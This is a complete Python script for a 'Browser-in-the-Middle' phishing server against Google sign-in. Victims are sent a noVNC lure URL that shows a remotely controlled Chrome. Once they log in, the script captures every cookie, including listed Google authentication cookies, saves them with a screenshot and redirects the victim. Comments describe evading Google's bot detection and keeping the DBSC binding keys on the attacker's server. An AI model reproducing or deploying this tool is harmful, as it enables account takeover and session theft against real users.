#!/usr/bin/env python3
"""
bitm_server.py -- Browser-in-the-Middle: native Chrome + noVNC

Architecture:
  Victim --[HTTPS/WSS]--> websockify --> x11vnc --> Xvfb --> Chrome (native)
                                                                   |
                                                            accounts.google.com

IMPORTANT: Chrome is launched directly via subprocess, NOT via Playwright.
Playwright adds --enable-automation and sets navigator.webdriver=true, which
Google detects immediately. Here, Chrome runs in fully normal mode.

Playwright is only used AFTER authentication to extract cookies via
connect_over_cdp() -- at that point, detection no longer matters.

DBSC: the binding ceremony happens on the ATTACKER's server.
The cryptographic keys live in the Chrome profile (--user-data-dir).
The attacker owns the keys => the session cookie remains usable
from this server, even with DBSC enabled (Chrome >= 127).

Linux prerequisites:
  bash setup.sh

Usage:
  python3 bitm_server.py
  python3 bitm_server.py --chrome-path /usr/bin/google-chrome-stable

TLS: use a reverse proxy (Caddy, nginx) in front of websockify.
"""

import argparse
import asyncio
import json
import os
import shutil
import subprocess
import sys
import time
import urllib.request
from datetime import datetime
from pathlib import Path


GOOGLE_AUTH_COOKIES = [
    "SID", "HSID", "SSID", "APISID", "SAPISID", "LSID",
    "__Secure-1PSID", "__Secure-1PAPISID",
    "__Secure-3PSID", "__Secure-3PAPISID",
    "__Host-GAPS", "1P_JAR", "NID",
]

LOGIN_SUCCESS_PATTERNS = [
    "myaccount.google.com",
    "mail.google.com",
    "google.com/webhp",
    "accounts.google.com/b/",
    "accounts.google.com/SignOutOptions",
    "drive.google.com",
    "calendar.google.com",
]


def find_chrome(preferred=None):
    """Find a Chrome/Chromium binary on the system."""
    if preferred:
        if os.path.isfile(preferred) and os.access(preferred, os.X_OK):
            return preferred
        found = shutil.which(preferred)
        if found:
            return found

    for name in [
        "google-chrome", "google-chrome-stable",
        "chromium-browser", "chromium",
    ]:
        found = shutil.which(name)
        if found:
            return found

    pw_cache = Path.home() / ".cache" / "ms-playwright"
    if pw_cache.exists():
        for candidate in sorted(pw_cache.rglob("chrome"), reverse=True):
            if candidate.is_file() and os.access(str(candidate), os.X_OK):
                return str(candidate)

    return None


class BitMServer:

    def __init__(self, args):
        self.target_url = args.target_url
        self.display_num = args.display
        self.vnc_port = args.vnc_port
        self.ws_port = args.ws_port
        self.cdp_port = args.cdp_port
        self.width = args.width
        self.height = args.height
        self.novnc_dir = args.novnc_dir
        self.output_dir = Path(args.output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.redirect_url = args.redirect_url
        self.timeout = args.timeout

        self.data_dir = str(
            Path(args.user_data_dir).resolve()
            if args.user_data_dir
            else (self.output_dir / "chrome_profile").resolve()
        )

        self.chrome_path = find_chrome(args.chrome_path)
        if not self.chrome_path:
            sys.exit(
                "[!] Chrome not found. Install google-chrome or\n"
                "    specify --chrome-path /path/to/chrome"
            )

        self.procs = []
        self.captured = False

    # ------------------------------------------------------------------ #
    #  System processes                                                    #
    # ------------------------------------------------------------------ #

    def _spawn(self, cmd, label):
        proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        self.procs.append((label, proc))
        return proc

    def start_xvfb(self):
        display = f":{self.display_num}"
        self._spawn([
            "Xvfb", display,
            "-screen", "0", f"{self.width}x{self.height}x24",
            "-ac", "-nolisten", "tcp",
        ], "Xvfb")
        os.environ["DISPLAY"] = display
        time.sleep(0.8)
        print(f"[+] Xvfb :{self.display_num}  {self.width}x{self.height}")

    def start_vnc(self):
        self._spawn([
            "x11vnc",
            "-display", f":{self.display_num}",
            "-rfbport", str(self.vnc_port),
            "-shared", "-forever", "-nopw",
            "-noxdamage", "-cursor", "arrow",
            "-nowf", "-ncache", "0",
        ], "x11vnc")
        time.sleep(0.5)
        print(f"[+] x11vnc :{self.vnc_port}")

    def start_websockify(self):
        cmd = [
            "websockify", "--web", self.novnc_dir,
            str(self.ws_port), f"localhost:{self.vnc_port}",
        ]
        self._spawn(cmd, "websockify")
        time.sleep(0.5)
        print(f"[+] websockify :{self.ws_port}")

    # ------------------------------------------------------------------ #
    #  Native Chrome (no automation signals)                               #
    # ------------------------------------------------------------------ #

    def start_chrome(self):
        """Launch Chrome directly, without Playwright, without --enable-automation.
        navigator.webdriver stays false, no BotGuard/Google detection."""
        cmd = [
            self.chrome_path,
            f"--window-size={self.width},{self.height}",
            "--kiosk",
            "--no-first-run",
            "--no-default-browser-check",
            "--disable-infobars",
            "--disable-session-crashed-bubble",
            "--disable-features=TranslateUI",
            "--hide-crash-restore-bubble",
            "--lang=fr-FR",
            "--no-sandbox", # Required for sudo run
            f"--remote-debugging-port={self.cdp_port}",
            f"--user-data-dir={self.data_dir}",
            self.target_url,
        ]
        self._spawn(cmd, "chrome")
        self._wait_for_cdp()
        print(f"[+] Chrome (native, no automation) -> {self.target_url}")
        print(f"    Binary  : {self.chrome_path}")
        print(f"    Profile : {self.data_dir}")
        print(f"    CDP     : http://localhost:{self.cdp_port}")

    def _wait_for_cdp(self, retries=15):
        """Wait for the CDP port to become available."""
        for i in range(retries):
            time.sleep(1)
            try:
                with urllib.request.urlopen(
                    f"http://localhost:{self.cdp_port}/json/version", timeout=2
                ) as resp:
                    info = json.loads(resp.read())
                    ver = info.get("Browser", "?")
                    print(f"[+] CDP ready: {ver}")
                    return
            except Exception:
                pass
        sys.exit("[!] Chrome did not start (CDP timeout)")

    # ------------------------------------------------------------------ #
    #  Login detection via CDP polling                                     #
    # ------------------------------------------------------------------ #

    def _get_cdp_targets(self):
        """GET /json on the CDP port -- returns the list of open tabs."""
        try:
            with urllib.request.urlopen(
                f"http://localhost:{self.cdp_port}/json", timeout=2
            ) as resp:
                return json.loads(resp.read())
        except Exception:
            return []

    async def _poll_for_login(self):
        """Monitor Chrome tab URLs via CDP (without Playwright)."""
        start = time.time()
        while not self.captured:
            await asyncio.sleep(4)

            elapsed = time.time() - start
            if elapsed > self.timeout:
                print(f"\n[!] Timeout ({self.timeout}s) with no login")
                await self._capture(partial=True)
                return

            targets = self._get_cdp_targets()
            for t in targets:
                url = t.get("url", "")
                if any(p in url for p in LOGIN_SUCCESS_PATTERNS):
                    print(f"\n[!] Login detected -> {url}")
                    await self._capture()
                    return

    # ------------------------------------------------------------------ #
    #  Capture via Playwright connect_over_cdp (post-auth only)            #
    # ------------------------------------------------------------------ #

    async def _capture(self, partial=False):
        """Connect Playwright to the running Chrome to extract cookies.
        Playwright is NOT used during auth -- only afterwards."""
        if self.captured:
            return
        self.captured = True

        await asyncio.sleep(3)

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        status = "partial" if partial else "complete"
        cookies = []
        final_url = ""
        page_title = ""

        try:
            from playwright.async_api import async_playwright
            pw = await async_playwright().start()
            try:
                browser = await pw.chromium.connect_over_cdp(
                    f"http://localhost:{self.cdp_port}"
                )
                contexts = browser.contexts
                for ctx in contexts:
                    cookies.extend(await ctx.cookies())

                if contexts and contexts[0].pages:
                    page = contexts[0].pages[0]
                    final_url = page.url
                    try:
                        page_title = await page.title()
                    except Exception:
                        pass

                    shot = self.output_dir / f"bitm_capture_{ts}.png"
                    try:
                        await page.screenshot(path=str(shot))
                        print(f"[+] Screenshot  : {shot}")
                    except Exception:
                        pass

                    if self.redirect_url and not partial:
                        await asyncio.sleep(2)
                        try:
                            await page.goto(self.redirect_url)
                            print(f"[+] Victim redirected -> {self.redirect_url}")
                        except Exception:
                            pass

                await browser.close()
            finally:
                await pw.stop()
        except Exception as e:
            print(f"[!] CDP extraction failed: {e}")
            print("    Cookies remain in the Chrome profile.")

        auth = [c for c in cookies if c["name"] in GOOGLE_AUTH_COOKIES]

        session = {
            "timestamp": ts,
            "status": status,
            "method": "bitm_native_chrome",
            "target_url": self.target_url,
            "final_url": final_url,
            "page_title": page_title,
            "chrome_profile": self.data_dir,
            "cookies": cookies,
            "auth_cookies": auth,
        }

        path = self.output_dir / f"bitm_session_{ts}.json"
        path.write_text(json.dumps(session, indent=2, default=str))

        print(f"[+] Session saved: {path}")
        print(f"    Auth cookies: {len(auth)}/{len(GOOGLE_AUTH_COOKIES)}")
        for c in auth:
            print(f"    {c['name']}: {c['value'][:24]}...")

        print(f"[+] Chrome profile: {self.data_dir}")
        print("    Contains cookies + DBSC keys (if Chrome >= 127)")

    # ------------------------------------------------------------------ #
    #  Lifecycle                                                           #
    # ------------------------------------------------------------------ #

    def cleanup(self):
        for label, proc in self.procs:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill() # For the PoC, kill the browser immediately after authentication. A redirection would be better
                except Exception:
                    pass
        if self.procs:
            print(f"[+] {len(self.procs)} processes stopped")

            username = os.environ.get("SUDO_USER")
            if username:
                # Pass arguments as a safe list
                subprocess.run(["chown", "-R", username, "sessions/chrome_profile"])

    async def run(self):
        sep = "=" * 62
        print(sep)
        print(" Browser-in-the-Middle -- native Chrome + noVNC")
        print(sep)
        print(f" Target    : {self.target_url}")
        print(f" Chrome    : {self.chrome_path}")
        print(f" Display   : :{self.display_num}  {self.width}x{self.height}")
        print(f" noVNC     : http://0.0.0.0:{self.ws_port}")
        print(f" CDP       : http://localhost:{self.cdp_port}")
        print(f" Profile   : {self.data_dir}")
        print(f" Output    : {self.output_dir}")
        print(f" Timeout   : {self.timeout}s")
        print(sep)

        self.start_xvfb()
        self.start_vnc()
        self.start_websockify()
        self.start_chrome()

        lure = (
            f"http://<YOUR_IP>:{self.ws_port}"
            f"/vnc_lite.html?autoconnect=true&resize=scale"
        )
        print(f"\n[*] Lure URL to send to the victim:")
        print(f"    {lure}")
        print("[*] Waiting for authentication...\n")

        try:
            await self._poll_for_login()
        except KeyboardInterrupt:
            print("\n[*] Stopped by operator")
            if not self.captured:
                await self._capture(partial=True)
        finally:
            self.cleanup()


# ---------------------------------------------------------------------- #
#  CLI                                                                    #
# ---------------------------------------------------------------------- #

def main():
    p = argparse.ArgumentParser(
        description="BitM: Google session capture via remote browser"
    )
    p.add_argument(
        "--target-url",
        default=(
            "https://accounts.google.com/signin/v2/identifier"
            "?flowName=GlifWebSignIn&flowEntry=ServiceLogin"
        ),
        help="Initial URL loaded in Chrome",
    )
    p.add_argument("--chrome-path", default=None,
                   help="Path to the Chrome/Chromium binary")
    p.add_argument("--display", type=int, default=99,
                   help="Xvfb display number (default: 99)")
    p.add_argument("--vnc-port", type=int, default=5999,
                   help="x11vnc port (default: 5999)")
    p.add_argument("--ws-port", type=int, default=6080,
                   help="websockify/noVNC port (default: 6080)")
    p.add_argument("--cdp-port", type=int, default=9222,
                   help="Chrome DevTools Protocol port (default: 9222)")
    p.add_argument("--width", type=int, default=1280,
                   help="Browser width (default: 1280)")
    p.add_argument("--height", type=int, default=900,
                   help="Browser height (default: 900)")
    p.add_argument("--novnc-dir", default="/opt/noVNC",
                   help="noVNC installation directory")
    p.add_argument("--output-dir", default="./sessions",
                   help="Output directory (default: ./sessions)")
    p.add_argument("--user-data-dir", default=None,
                   help="Chrome profile directory (default: sessions/chrome_profile)")
    p.add_argument("--redirect-url", default="https://mail.google.com",
                   help="Redirect URL after capture")
    p.add_argument("--timeout", type=int, default=600,
                   help="Timeout in seconds (default: 600)")
    args = p.parse_args()

    asyncio.run(BitMServer(args).run())


if __name__ == "__main__":
    main()
